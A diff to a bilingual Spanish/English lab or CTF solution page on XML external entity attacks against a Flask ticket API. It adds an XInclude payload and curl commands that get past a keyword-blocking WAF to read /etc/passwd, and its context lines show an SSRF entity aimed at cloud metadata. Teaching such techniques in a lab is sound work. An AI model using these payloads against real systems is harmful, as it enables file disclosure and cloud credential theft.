@@ -161,11 +161,15 @@
 # SSRF a metadatos cloud
 &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</pre>
         El filtro bloquea <code>file://</code> pero no <code>http://</code> — permite SSRF a servicios internos.</li>
-      <li><strong>Hard:</strong> Bloquea <code>DOCTYPE, ENTITY, SYSTEM, PUBLIC</code> case-insensitive. XXE directo está bloqueado. Usa técnicas avanzadas:
-        <pre># XXEinjector para Out-of-Band (OOB) extraction
-ruby XXEinjector.rb --host={{ target_ip }} --httpport=8080 \
-  --file=/etc/passwd --oob=http \
-  --phpfilter --url="http://TARGET_IP/xxe/api"</pre></li>
+      <li><strong>Hard:</strong> El WAF bloquea <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code> y <code>PUBLIC</code> — el XXE clásico y XXEinjector (que genera un <code>&lt;!DOCTYPE&gt;</code> para OOB) fallan por diseño. El flag <code>--phpfilter</code> además solo funciona en apps PHP, no en Python/Flask.
+        <br><br>Bypass con <strong>XInclude</strong> — una especificación XML distinta que no contiene ninguna de las palabras bloqueadas:
+        <pre>&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+        El backend llama a <code>lxml.XInclude()</code> tras parsear → el elemento <code>&lt;xi:include&gt;</code> se sustituye por el contenido del archivo. El WAF no lo detecta porque ninguna de sus palabras clave aparece en el payload.</li>
     </ol>
 
     <h3>¿Por qué funciona?</h3>
@@ -186,9 +190,15 @@ ruby XXEinjector.rb --host={{ target_ip }} --httpport=8080 \
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">XXEinjector</span> <span class="tools-badge">curl</span></div>
 
     <h3>Explotación con curl</h3>
-    <pre>curl -X POST http://TARGET_IP/xxe/api \
+    <pre># Easy: entidad clásica
+curl -X POST http://TARGET_IP/xxe/api \
   -H "Content-Type: application/xml" \
-  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
+  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'
+
+# Hard: bypass con XInclude (no usa DOCTYPE ni ENTITY)
+curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Vulnerability Analysis</h3>
@@ -255,11 +265,15 @@ ruby XXEinjector.rb --host={{ target_ip }} --httpport=8080 \
 # SSRF to cloud metadata
 &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</pre>
         Filter blocks <code>file://</code> but not <code>http://</code> — allows SSRF to internal services.</li>
-      <li><strong>Hard:</strong> Blocks <code>DOCTYPE, ENTITY, SYSTEM, PUBLIC</code> case-insensitive. Direct XXE is blocked. Use advanced techniques:
-        <pre># XXEinjector for Out-of-Band (OOB) extraction
-ruby XXEinjector.rb --host={{ target_ip }} --httpport=8080 \
-  --file=/etc/passwd --oob=http \
-  --phpfilter --url="http://TARGET_IP/xxe/api"</pre></li>
+      <li><strong>Hard:</strong> The WAF blocks <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code> and <code>PUBLIC</code> — classic XXE and XXEinjector (which generates a <code>&lt;!DOCTYPE&gt;</code> for OOB) fail by design. The <code>--phpfilter</code> flag also only works on PHP apps, not Python/Flask.
+        <br><br>Bypass with <strong>XInclude</strong> — a different XML spec that uses none of the blocked keywords:
+        <pre>&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+        The backend calls <code>lxml.XInclude()</code> after parsing → the <code>&lt;xi:include&gt;</code> element is replaced with the file contents. The WAF doesn't catch it because none of its keywords appear in the payload.</li>
     </ol>
 
     <h3>Why does it work?</h3>
@@ -280,9 +294,15 @@ ruby XXEinjector.rb --host={{ target_ip }} --httpport=8080 \
     <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">XXEinjector</span> <span class="tools-badge">curl</span></div>
 
     <h3>Exploitation with curl</h3>
-    <pre>curl -X POST http://TARGET_IP/xxe/api \
+    <pre># Easy: classic entity
+curl -X POST http://TARGET_IP/xxe/api \
   -H "Content-Type: application/xml" \
-  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
+  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'
+
+# Hard: XInclude bypass (no DOCTYPE, no ENTITY)
+curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
   </div>
 </div>
 {% endblock %}
